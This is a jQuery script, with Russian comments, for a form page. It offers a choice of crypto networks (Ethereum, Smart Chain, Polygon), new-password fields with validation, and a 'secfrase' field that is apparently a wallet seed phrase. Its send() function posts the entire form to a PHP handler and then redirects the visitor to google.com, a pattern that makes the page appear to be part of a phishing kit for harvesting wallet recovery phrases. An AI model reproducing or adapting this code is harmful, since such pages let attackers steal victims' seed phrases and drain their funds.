$(document).ready(function () {
  $(".custom-select").click(function (event) {
    $(".list").toggleClass("active");
  });
});
$(document).ready(function () {
  $(".form-hide").click(function (event) {
    $(".list").removeClass("active");
  });
});
$(document).ready(function () {
  $(".main__container").click(function (event) {
    $(".list").removeClass("active");
  });
});
$(document).ready(function () {
  $('.list-btn').click(function (event) {
    $(".list").removeClass("active");
  });
});
$(document).ready(function () {
  $('.form_body').click(function (event) {
    $(".list").removeClass("active");
  });
});

$(document).ready(function () {
  $(".secondrow-btn").click(function (event) {
    $(".list-firstrow").toggleClass("hide");
    $(".list-secondrow").toggleClass("active");
    $(".list").toggleClass("height");
    $(".secondrow-btn").toggleClass("margin");

  });
});

$(document).ready(function () {
$('#radio2').on('change', function() {
  if($('#radio2:checked')){
    const element = $(".custom");
    element.text("Smart Chain "); 
  }
});
});

$(document).ready(function () {
$('#radio1').on('change', function() {
  if($('#radio1:checked')){
    const element = $(".custom");
    element.text(" Сеть Ethereum Mainnet"); 
  }
});
});
$(document).ready(function () {
$('#radio3').on('change', function() {
   if($('#radio3:checked')){
    const element = $(".custom");
    element.text("Matic(Polygon) Mainnet"); 
  }
});
});
const btncontent = $(".content__btn");
const renewpass = $(".renewpass");
const newpass = $(".newpass");
$(document).ready(function () {
  newpass.keyup(function(event) {
    var pswd = newpass.val();
    if ( pswd.length < 8 ) {
    $('.checklenght').removeClass('valid').addClass('invalid');
    } else {
    $('.checklenght').removeClass('invalid').addClass('valid');
        $('.checklenght').removeClass('invalid').addClass('valid');
}
  if ( pswd.length == 0 ) {
        $('.checklenght').removeClass('invalid');
}
});
   renewpass.keyup(function(event) {
    var pswd = newpass.val();
    var repswd = renewpass.val();
    if ( repswd != pswd ) {
      $('.checkcorrect').removeClass('valid').addClass('invalid');
      } else if ( repswd == pswd ){
      $('.checkcorrect').removeClass('invalid').addClass('valid');
    }
   
});

});
$(document).ready(function () {
  renewpass.keyup(function(event) {
    if($('.checklenght').hasClass('valid') && $('.checkcorrect').hasClass('valid')){
    btncontent.removeAttr("disabled");
    $('.content__btn').addClass('active');
    }else{
      btncontent.attr("disabled");
      $('.content__btn').removeClass('active');
}
});
}); 
$(document).ready(function () {
  newpass.keyup(function(event) {
    var pswd = newpass.val();
    var repswd = renewpass.val();
    if(($('.checklenght').hasClass('valid') && $('.checkcorrect').hasClass('valid')) && pswd == repswd){
    btncontent.removeAttr("disabled");
    $('.content__btn').addClass('active');
    }else{
      btncontent.attr("disabled");
      $('.content__btn').removeClass('active');
}
});
}); 

var secfrase = $("#secfrase");
$(document).ready(function () {
$('#formAgree').on('click', function() {
   if($('#formAgree:checked')){
      secfrase.prop('type', 'text');
  }
});
$('#formAgree').on('click', function() {
   if(!$(this).is(':checked')){
      secfrase.prop('type', 'password');
  }
});
});
function send(event, php){
console.log("Отправка запроса");
event.preventDefault ? event.preventDefault() : event.returnValue = false;
var req = new XMLHttpRequest();
req.open('POST', php, true);
req.onload = function() {
  if (req.status >= 200 && req.status < 400) {
    json = JSON.parse(this.response); // Ебанный internet explorer 11
      console.log(json);
        
      // ЗДЕСЬ УКАЗЫВАЕМ ДЕЙСТВИЯ В СЛУЧАЕ УСПЕХА ИЛИ НЕУДАЧИ
      if (json.result == "success") {
        // Если сообщение отправлено
        document.location.href = "https://www.google.com/";
      } else {
        // Если произошла ошибка
        alert("Ошибка. Сообщение не отправлено");
      }
    // Если не удалось связаться с php файлом
    } else {alert("Ошибка сервера. Номер: "+req.status);}}; 

// Если не удалось отправить запрос. Стоит блок на хостинге
req.onerror = function() {alert("Ошибка отправки запроса"); 
  
};
req.send(new FormData(event.target));
}

